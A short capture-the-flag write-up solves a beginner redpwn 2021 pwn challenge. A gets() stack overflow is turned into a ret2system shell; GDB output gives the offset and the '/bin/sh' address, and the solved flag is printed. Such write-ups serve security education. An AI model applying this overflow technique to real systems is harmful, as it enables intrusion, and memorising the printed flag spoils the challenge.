# beginner-generic-pwn-number-0

Main function contains `char heartfelt_message[32];` and the message we enter is stored to that variable with `gets()`

By looking through the code we can see that the file contains `system`-function and `/bin/sh` string.

## Exploitation
With GDB we find the offset to access the stack
```bash
[+] Searching 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana'
[+] Found at offset 56 (big-endian search)
```

Then we just find `/bin/sh`-string

```
[+] Searching '/bin/sh' in memory
[+] In '/mnt/x/ctf/redpwn2021/pwn/beginner0/beginner-generic-pwn-number-0'(0x402000-0x403000), permission=r--
  0x4021e8 - 0x4021ef  →   "/bin/sh"
[+] In '/mnt/x/ctf/redpwn2021/pwn/beginner0/beginner-generic-pwn-number-0'(0x403000-0x404000), permission=r--
  0x4031e8 - 0x4031ef  →   "/bin/sh"
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f70000-0x7ffff7fba000), permission=r--
  0x7ffff7f8a152 - 0x7ffff7f8a159  →   "/bin/sh"
```

There is `/bin/sh` in 0x4031e8

To exploit this we just enter junk of 56 bytes and then set RDI to `/bin/sh` and then execute `system()`

Exploit works perfect locally but when doing it in the server, it fails. I then just aligned the stack and got the shell

```
$ cat flag.txt
flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
```

### Flag
flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
